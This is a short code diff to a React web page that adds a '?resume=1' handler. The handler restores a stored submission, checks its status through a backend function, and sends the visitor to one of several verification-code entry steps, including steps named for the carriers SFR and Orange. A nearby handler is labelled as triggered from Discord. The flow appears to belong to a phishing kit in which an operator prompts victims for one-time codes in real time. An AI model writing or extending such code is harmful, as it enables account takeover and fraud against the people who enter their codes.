@@ -52,6 +52,30 @@ export default function Home() {
       .catch(() => {});
   }, []);
 
+  // Handle ?resume=1 — restore a pending submission to its code entry step
+  useEffect(() => {
+    const p = getParams();
+    if (p.get("resume") !== "1") return;
+    const storedId = sessionStorage.getItem("submissionId");
+    if (!storedId) { setStep("form"); return; }
+    setSubmissionId(storedId);
+    try {
+      const storedData = JSON.parse(sessionStorage.getItem("submittedData"));
+      if (storedData) setSubmittedData(storedData);
+    } catch {}
+    base44.functions.invoke("checkStatus", { submissionId: storedId })
+      .then((res) => {
+        const s = res?.data?.status;
+        const map = { code_ready: "code", code6_ready: "code6", code6sfr_ready: "code6sfr", code6orange_ready: "code6orange" };
+        window.history.replaceState({}, "", "/");
+        setStepPersisted(map[s] || "validation");
+      })
+      .catch(() => {
+        window.history.replaceState({}, "", "/");
+        setStep("form");
+      });
+  }, []);
+
   // Handle ?trigger=ID from Discord (send code ready)
   useEffect(() => {
     const triggerId = getParams().get("trigger");
